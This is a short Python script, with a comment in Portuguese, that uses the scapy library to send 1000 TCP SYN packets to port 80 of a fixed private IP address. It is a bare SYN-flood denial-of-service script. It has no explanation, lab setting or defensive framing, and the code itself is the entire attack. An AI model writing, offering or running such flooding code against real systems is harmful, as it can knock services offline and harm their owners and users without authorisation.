from scapy.all import *

target_ip = "192.168.1.100"
target_port = 80

for i in range(1000):  # Envia 1000 pacotes SYN
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, flags="S")
    send(ip/tcp)
